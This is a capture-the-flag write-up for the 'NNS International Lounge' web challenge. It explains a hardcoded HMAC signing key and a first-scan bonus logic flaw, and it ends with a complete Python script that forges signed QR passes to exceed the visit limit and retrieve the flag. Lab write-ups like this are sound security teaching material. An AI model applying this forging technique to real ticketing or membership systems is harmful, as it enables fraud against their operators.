# [NNS International Lounge](https://nnsc.tf/challenges?challenge=misc_NNS+International+Lounge)

**Description:**

Welcome to the NNS International Lounge, where every member receives four complimentary visits.

But remember, only four visits. Nothing more.

## Step 1: Read the source

The archive gives you `app.py`. Two things matter immediately.

First, how a pass is signed:

```python
TICKET_SECRET = hashlib.sha256(b"lounge").digest()

def sign(fields):
    return hmac.new(TICKET_SECRET, "/".join(fields).encode(), hashlib.sha256).hexdigest()[:6]
```

`TICKET_SECRET` isn't random. It's `sha256(b"lounge")`, a fixed value baked into the source. Compare this to the Flask session key a few lines up, `secrets.token_hex(32)`, which actually is random and unknown to us. The ticket secret is not. This means anyone who has read the source can compute a valid signature for any ticket contents they want.

Second, what a pass actually contains and how it's checked when scanned:

```python
def ticket_fields(user):
    ...
    return [
        "LS", issued[:6], issued, expires, user["member_id"], "NNS",
        "201", user["name"], str(user["remaining_visits"]),
    ]
```

Nine fields, joined with `/`, followed by a 6-character HMAC as a tenth field. The last of the nine fields is `remaining_visits`.

## Step 2: Read the vulnerable endpoint

```python
@app.post("/lounge")
def scan():
    user = current_user()
    ...
    fields = decode_pass(read_qr(request.files.get("ticket")))
    encoded_remaining = int(fields[-1])
    if fields[:-1] != ticket_fields(user)[:-1]:
        raise Rejected("Pass details do not match the issued membership.")
    if datetime.now(timezone.utc) > user["expires_at"]:
        raise Rejected("This pass has expired.")
    with STORE_LOCK:
        activating_bonus = user["visits_used"] == 0 and encoded_remaining > VISIT_ALLOWANCE
        if encoded_remaining != user["remaining_visits"] and not activating_bonus:
            raise Rejected("This pass is stale. Download the newly updated QR pass.")
        if encoded_remaining <= 0:
            raise Rejected("No lounge visits remain on this membership.")
        user["visits_used"] += 1
        user["remaining_visits"] = encoded_remaining - 1
    return render_template("lounge.html", user=user, flag=FLAG if user["visits_used"] > VISIT_ALLOWANCE else None)
```

Two things to notice.

The identity fields have to match the server's live record of you exactly, name, member ID, issued/expiry timestamps. That's not a real obstacle, since you're only ever forging your own membership, not impersonating someone else.

The real bug is `activating_bonus`. On your very first scan ever, if the `remaining_visits` value in your submitted ticket is greater than `VISIT_ALLOWANCE`, the code skips the "is this ticket stale" check completely. That means the very first thing you scan can set `remaining_visits` to literally anything you want, as long as you can produce a validly signed ticket. And since the signing key is a hardcoded string, you can.

After that first scan, each following scan just has to match whatever `remaining_visits` the server currently has on file for you, decrementing by one each time. Since you're the one who set that number in the first place, you always know what it is.

So the plan is:

1. Forge a ticket with your real identity fields but `remaining_visits = 1000000`. Submit it as your first scan. This slips past the stale check, `visits_used` becomes 1, and the server now thinks you have 999999 visits left.
2. Forge four more tickets, each with `remaining_visits` equal to whatever the server now has on record, signed correctly. Each one is accepted because it matches exactly.
3. After the 5th successful scan, `visits_used` is 5, which is greater than `VISIT_ALLOWANCE`, and the flag gets rendered into the page.

## Step 3: Get your real identity fields

You can't just invent the identity fields, they have to match what the server has stored for your account. The easiest way to get them exactly right is to let the server generate them for you and then read them back.

Register an account, then request `/pass.png`. This is a real, validly signed QR code for your account with `remaining_visits = 4`. Decode that QR code and you get the full 10-field pass, including the 8 identity fields you need to reuse. You don't need to recompute timestamps or guess formatting, you just copy the fields the server already gave you.

## Step 4: Forge and submit

For each forged ticket:

1. Take the 8 identity fields recovered in Step 3.
2. Append the `remaining_visits` value you want for this scan.
3. Compute the signature yourself with `hmac.new(sha256(b"lounge"), "/".join(fields).encode(), sha256).hexdigest()[:6]`, the same function the server uses.
4. Join everything with `/` to get the pass string.
5. Encode that string as a QR code image and POST it to `/lounge` as the `ticket` file.

Do this once with `remaining_visits = 1000000` to trigger the bonus bypass, then four more times with `999999`, `999998`, `999997`, `999996` in that order.

## Step 5: Read the flag

The 5th accepted scan renders `lounge.html` with `visits_used = 5 > VISIT_ALLOWANCE`, so the `{% if flag %}` block in the template is populated and the flag string appears in the page body.

## Minimal working script

```python
import hashlib, hmac, io, re
import requests, qrcode
from PIL import Image
from pyzbar.pyzbar import decode as qr_decode

BASE = "https://nns-international-lounge-6e9250cb3804.chall.nnsc.tf"
SECRET = hashlib.sha256(b"lounge").digest()

def sign(fields):
    return hmac.new(SECRET, "/".join(fields).encode(), hashlib.sha256).hexdigest()[:6]

def qr_png(payload):
    buf = io.BytesIO()
    qrcode.make(payload).save(buf, format="PNG")
    buf.seek(0)
    return buf

s = requests.Session()
s.post(f"{BASE}/register", data={"first_name": "Alice", "last_name": "Exploit", "password": "password123"})

r = s.get(f"{BASE}/pass.png")
decoded = qr_decode(Image.open(io.BytesIO(r.content)))[0].data.decode()
identity_fields = decoded.split("/")[:-2]   # drop remaining_visits and mac

def submit(remaining):
    fields = identity_fields + [str(remaining)]
    payload = "/".join(fields + [sign(fields)])
    return s.post(f"{BASE}/lounge", files={"ticket": ("t.png", qr_png(payload), "image/png")})

submit(1_000_000)
for remaining in range(999_999, 999_995, -1):
    r = submit(remaining)
    m = re.search(r"NNS\{.*?\}", r.text)
    if m:
        print(m.group())
        break
```

Requires `pip install requests "qrcode[pil]" pyzbar` and the system library `libzbar0` for QR decoding.
